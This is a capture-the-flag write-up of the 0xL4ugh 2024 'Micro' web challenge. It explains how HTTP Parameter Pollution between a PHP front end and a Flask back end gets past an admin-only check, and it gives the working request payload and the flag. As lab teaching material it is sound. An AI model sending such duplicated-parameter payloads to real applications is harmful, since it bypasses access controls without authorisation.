# Micro

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @josefk, @.h0ps
- Contributor: @siunam
- 116 solves / 50 points
- Difficulty: Easy
- Author: abdoghazy
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

Remember Bruh 1,2 ? This is bruh 3 : D  
login with admin:admin and you will get the flag :*

[Link](http://20.115.83.90:1338)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211160444.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211150200.png)

In here, we can see that the index page is a login page.

We can try to enter some dummy credentials in it and see what will happen:

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211150342.png)

Upon submission, if the credential was incorrect, it'll return: `Response from Flask app: Invalid credentials`. 

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211150820.png)

When we clicked the "Login" button, it'll send a POST request to `/` with parameter `username`, `password`, and `login-submit`.

Hmm... There's no much we can do, let's read the source code.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/Web/Micro/Micro_togive.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/0xL4ugh-CTF-2024/Web/Micro)-[2024.02.11|15:05:41(HKT)]
└> file Micro_togive.zip 
Micro_togive.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/0xL4ugh-CTF-2024/Web/Micro)-[2024.02.11|15:05:43(HKT)]
└> unzip Micro_togive.zip 
Archive:  Micro_togive.zip
  inflating: init.db                 
  inflating: init.sh                 
   creating: src/
  inflating: src/index.php           
  inflating: app.py                  
  inflating: Dockerfile              
```

After reading the source code for a little bit, we can know that this web application is **running PHP and Python's Flask**.

Let's dig through the PHP code first!

**In `src/index.php`, we can see how the back-end processes our login POST request:**
```php
[...]
if(isset($_POST['login-submit']))
{
    if(!empty($_POST['username'])&&!empty($_POST['password']))
    {
        $username=$_POST['username'];
        $password=md5($_POST['password']);
        if(Check_Admin($username) && $_SERVER['REMOTE_ADDR']!=="127.0.0.1")
        {
            die("Admin Login allowed from localhost only : )");
        }
        else
        {
            send_to_api(file_get_contents("php://input"));
        }   

    }
    else
    {
        echo "<script>alert('Please Fill All Fields')</script>";
    }
}
[...]
```

**When POST parameter `login-submit`, `username`, and `password` is provided, it'll check the `username` is an admin user, and the request is from localhost:**
```php
[...]
function Check_Admin($input)
{
    $input=iconv('UTF-8', 'US-ASCII//TRANSLIT', $input);   // Just to Normalize the string to UTF-8
    if(preg_match("/admin/i",$input))
    {
        return true;
    }
    else
    {
        return false;
    }
}
[...]
```

In function `Check_Admin()`, it first normalizes the `username` to UTF-8 characters. Then, using the PHP function `preg_match()` to check the `username` against a regular expression pattern, which finds the word `admin` (Case insensitive). If it's matched, return `true`.

So, it seems like we need to authenticate as an admin user with `admin` username?

However, even if we do that, how can we bypass the localhost filter? Plus, assume after we authenticated as `admin` user and passed the localhost check, the PHP application will just do nothing...

**Hmm... Anyways, what's that function `send_to_api()` doing?**

In PHP's built-in function [`file_get_contents()`](https://www.php.net/manual/en/function.file-get-contents.php), it's used to read the contents of a file into a string. In this case, the argument is `"php://input"`.

Uhh... What's that `php://input`? According to [PHP documentation](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.input), **the `php://input` wrapper is to read raw data from the request body**. With that said, it parses our POST request body (like POST parameter `username`, `password`, and `login-submit`) to function `send_to_api()`!

**Let's take a look at the function `send_to_api()`:**
```php
[...]
function send_to_api($data)
{
    $api_url = 'http://127.0.0.1:5000/login';
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => $data,
        ],
    ];
    $context = stream_context_create($options);
    $result = file_get_contents($api_url, false, $context);
    
    if ($result !== false) 
    {
        echo "Response from Flask app: $result";
    } 
    else 
    {
        echo "Failed to communicate with Flask app.";
    }
}
[...]
```

In here, it's sending a POST request to localhost port `5000` endpoint `/login` with our login POST request body!

Hmm... Port 5000, that's the default port in [Flask](https://flask.palletsprojects.com/en/3.0.x/), and based on the `echo` expression, **the PHP back-end is communicating with the internal Flask app**.

Speaking of the Flask app, let's read its source code!

**In route `/login`, we can see the logic behind the `/login` endpoint:**
```python
[...]
@app.route('/login', methods=['POST'])
def handle_request():
    try:
        username = request.form.get('username')
        password = hashlib.md5(request.form.get('password').encode()).hexdigest()
        # Authenticate user
        user_data = authenticate_user(username, password)

        if user_data:
            return "0xL4ugh{Test_Flag}"  
        else:
            return "Invalid credentials"  
    except:
        return "internal error happened"
[...]
```

As you can see, **if we are authenticated, it returns the flag**!

**But how the internal Flask app authenticate users?**
```python
[...]
# MySQL connection configuration
mysql_host = "127.0.0.1"
mysql_user = "ctf"
mysql_password = "ctf123"
mysql_db = "CTF"

def authenticate_user(username, password):
    try:
        conn = mysql.connector.connect(
            host=mysql_host,
            user=mysql_user,
            password=mysql_password,
            database=mysql_db
        )

        cursor = conn.cursor()

        query = "SELECT * FROM users WHERE username = %s AND password = %s"
        cursor.execute(query, (username, password))

        result = cursor.fetchone()

        cursor.close()
        conn.close()

        return result  
    except mysql.connector.Error as error:
        print("Error while connecting to MySQL", error)
        return None
[...]
```

Hmm... It's using MySQL to fetch one record from table `users`. Also, **it's using prepared statement**, so it's **not vulnerable to SQL injection**.

In this challenge description, it said:

> login with admin:admin and you will get the flag :*

Which means we need to **authenticate as user `admin` with password `admin`**.

Wait... **How can we authenticate as user `admin` without passing the check on the PHP side??**

Ah ha! **HTTP Parameter Pollution (HPP) between PHP and Flask**!

> Note: For more details about HPP, I'd recommend a YouTube video made by [PwnFunction](https://www.youtube.com/@PwnFunction): [HTTP Parameter Pollution Explained](https://www.youtube.com/watch?v=QVZBl8yxVX0)

According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/parameter-pollution#parameter-parsing-flask-vs.-php), we can see that there're some weird parameter parsing between PHP and Flask. Assume the POST request body is like this: `username=admin&username=foobar`.

- **What Flask will see: `username=admin`**
- **What PHP will see: `username=foobar`**

Hence, **Flask** will parse the **first duplicated parameter value**, whereas **PHP** parses **the second one**.

## Exploitation

**Armed with above information, we can exploit HPP to be authenticated as user `admin` in Flask WITHOUT getting passed with the check in PHP!**
```http
POST / HTTP/1.1
Host: 20.115.83.90:1338

username=admin&username=foobar&password=admin&login-submit=
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211160133.png)

Nice! We successfully authenticated as user `admin`!

- **Flag: `0xL4ugh{M1cr0_Serv!C3_My_Bruuh}`**

## Conclusion

What we've learned:

1. HTTP Parameter Pollution (HPP)